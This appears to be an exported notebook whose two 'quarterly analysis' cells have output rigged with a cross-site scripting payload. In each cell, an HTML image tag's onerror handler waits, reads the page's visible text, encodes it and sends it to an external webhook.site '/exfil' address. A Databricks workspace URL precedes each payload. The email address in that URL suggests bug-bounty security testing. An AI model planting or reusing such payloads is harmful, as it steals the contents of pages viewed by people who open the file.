# %%
# quarterly analysis
# Out:
# <div>quarterly analysis</div>STRING_STARThttps://dbc-3a3fe5b2-b60b.cloud.databricks.com/ajax-api/2.0/workspace-files/Users/hashau%2B1%40wearehackerone.com/.db_internal/notebook/spaces/workspace.json?o=7474651456398178STRING_END<img src="/x.png" onerror="setTimeout(function(){var s=document.body.innerText||&quot;&quot;;var i=new Image();i.src=&quot;https://webhook.site/c1f9e4c0-a45d-44dc-8b26-64ac9f27bd78/exfil?t=LIST&amp;d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(s.slice(0,400)))));},5000);">

# %%
# quarterly analysis
# Out:
# <div>quarterly analysis</div>STRING_STARThttps://dbc-3a3fe5b2-b60b.cloud.databricks.com/ajax-api/2.0/workspace-files/Users/hashau%2B1%40wearehackerone.com/acanary.ipynb?o=7474651456398178STRING_END<img src="/x.png" onerror="setTimeout(function(){var s=document.body.innerText||&quot;&quot;;var i=new Image();i.src=&quot;https://webhook.site/c1f9e4c0-a45d-44dc-8b26-64ac9f27bd78/exfil?t=SRC&amp;d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(s.slice(0,400)))));},5000);">
